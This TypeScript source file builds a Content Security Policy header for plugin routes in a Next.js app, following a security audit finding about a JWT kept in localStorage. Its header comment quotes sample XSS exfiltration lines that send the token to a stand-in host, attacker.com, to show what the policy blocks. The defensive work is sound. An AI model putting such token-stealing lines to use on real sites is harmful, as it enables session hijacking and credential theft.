/**
 * Content Security Policy for plugin routes — audit finding M1.
 *
 * The plugin route tree (`/(plugin)/*`) stores a JWT in localStorage
 * (see [[Plugin Token Auth]] Debates — "accepted tradeoff"). If an XSS
 * bug ever lands, the token is game-over unless exfiltration is blocked
 * at the network layer. This CSP is that layer.
 *
 * Key lock: `connect-src 'self'` — all XHR / fetch / WebSocket / beacon
 * requests are same-origin only. A rogue `<script>` injected via XSS
 * cannot `fetch('https://attacker.com/?token=...')` because the browser
 * refuses the connection. Same for `img-src 'self' blob: data:` —
 * `new Image().src = '...'` exfiltration is blocked.
 *
 * Script execution uses Next.js 15's canonical nonce + `strict-dynamic`
 * pattern. Inline scripts are rejected unless they carry the nonce
 * (which Next.js attaches to its own hydration scripts automatically
 * when the middleware sets `x-nonce` on the request). Any externally-
 * injected `<script>` won't have the nonce and won't execute.
 *
 * Not blocked by CSP (residual risk):
 * - `location.href = 'https://attacker.com/?...'` navigation-based
 *   exfiltration — no widely supported `navigate-to` directive.
 *   Mitigation: XSS prevention at the React layer (no dangerouslySetInnerHTML,
 *   no eval, no untrusted HTML).
 */

export interface CspOptions {
  /** Base64 nonce — must be set on inline hydration scripts. */
  nonce: string;
}

/**
 * Build the CSP header value for plugin HTML responses.
 *
 * Whitespace is collapsed so the header is a single line (some proxies
 * strip or complain about multi-line headers).
 */
export function buildPluginCsp({ nonce }: CspOptions): string {
  const directives = [
    "default-src 'self'",
    // 'strict-dynamic' allows nonced scripts to load further scripts
    // via createElement — required for Next.js chunk loading.
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    // Next.js sometimes emits inline style blocks for CSS-in-JS hydration;
    // the nonce covers those. 'self' covers the main CSS bundle.
    `style-src 'self' 'nonce-${nonce}'`,
    // blob: for Canvas.toBlob / Three.js; data: for small icons.
    "img-src 'self' blob: data:",
    "font-src 'self'",
    // The critical exfiltration lock.
    "connect-src 'self'",
    // No Flash / Silverlight / legacy plugins.
    "object-src 'none'",
    // Prevent <base> tag abuse for relative-URL redirect.
    "base-uri 'self'",
    // Forms can only submit back to us.
    "form-action 'self'",
    // Cannot be framed by any other site — blocks clickjacking-style
    // attacks even though the WebView isn't in a browser.
    "frame-ancestors 'none'",
  ];

  return directives.join("; ");
}
